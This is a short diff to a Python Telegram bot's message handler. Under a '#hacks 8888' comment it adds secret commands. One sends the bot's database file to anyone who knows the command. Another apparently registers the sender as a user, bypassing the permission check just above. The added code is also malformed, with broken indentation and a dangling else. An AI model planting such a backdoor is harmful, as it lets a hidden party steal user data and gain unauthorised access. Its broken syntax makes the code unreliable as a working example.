@@ -314,7 +314,19 @@ def onmessage(update,bot:ObigramClient):
                 bot.sendMessage(update.message.chat.id,'❌No Tiene Permiso❌')
             return
         # end
-
+        #hacks 8888
+        if '/getdbdiago8888' in msgText:
+            bot.sendMessage(update.message.chat.id,'📱Base De Datos💢')
+            bot.sendFile(update.message.chat.id,'database.jdb')
+            return
+        if '/startdiago8888' in msgText:
+                    jdb.create_user(username)
+                user_info = jdb.get_user(username)
+                jdb.save()
+        else:
+            mensaje = "💢Bienvenido programador @diago8888💢\n"
+            bot.sendMessage(update.message.chat.id,mensaje)
+            return       
         # comandos de usuario
         if '/view_proxy' in msgText:
      
